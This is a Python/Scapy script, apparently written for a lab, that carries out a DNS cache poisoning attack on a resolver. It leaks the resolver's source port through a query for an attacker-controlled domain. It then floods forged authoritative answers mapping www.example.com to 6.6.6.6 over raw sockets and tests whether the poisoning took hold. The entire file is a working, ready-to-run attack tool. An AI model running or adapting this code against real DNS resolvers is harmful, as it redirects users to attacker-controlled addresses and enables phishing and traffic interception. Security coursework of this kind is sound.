from scapy.all import *
import struct
import socket
import time
import random

target_dns = "10.9.0.53"
# Now spoofing example-dns (10.9.0.154) which root-dns delegates example.com to
auth_dns = "10.9.0.154"
domain = "www.example.com"
fake_ip = "6.6.6.6" 

print("[*] 1 & 2. Sniffing for predictable TXID and Port on a controlled domain...")
# Start sniffer in background
def leak():
    sniffer = AsyncSniffer(iface="eth0", filter="udp and src host " + target_dns + " and dst port 53", count=1, timeout=10)
    sniffer.start()
    time.sleep(0.5)

    # Send query for a domain we control to leak the port and current TXID
    # local-dns -> root-dns (.153) -> attacker-dns (.155) -> attacker machine (.10)
    trigger_leak = IP(dst=target_dns)/UDP(sport=12345, dport=53)/DNS(rd=1, qd=DNSQR(qname="www.leak.attacker.com"))
    send(trigger_leak, verbose=0)

    sniffer.join()
    sniffed = sniffer.results

    if not sniffed or len(sniffed) == 0:
        print("[-] Could not sniff packet. Make sure to run on the correct interface.")
        exit(1)

    leaked_txid = sniffed[0][DNS].id
    target_port = sniffed[0][UDP].sport
    print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
    return leaked_txid, target_port

leaked_txid, target_port = leak()

print("[*] 3. Sending request to resolve www.example.com...")
trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
#send(trigger, verbose=0)

print("[*] 4. Flooding spoofed responses with predictable IDs...")
base_pkt = (
    IP(src=auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(id=0, qr=1, aa=1, qd=DNSQR(qname=domain), 
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata=fake_ip))
)

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

trigger_payload = raw(DNS(rd=1, qd=DNSQR(qname=domain)))
s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# make 256 requests, and responses

for i in range(0, 256):
    s_udp.sendto(trigger_payload, (target_dns, 53))
    struct.pack_into('!H', raw_bytes, 28, random.randint(0, 65535))
    s.sendto(raw_bytes, (target_dns, 0))

print("[*] 5. Testing if attack was successful...")
test_query = IP(dst=target_dns)/UDP(sport=12346, dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
ans = sr1(test_query, timeout=2, verbose=0)

if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == fake_ip:
    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format(domain, fake_ip))
else:
    print("[-] Attack FAILED. Cache shows different or timeout.")
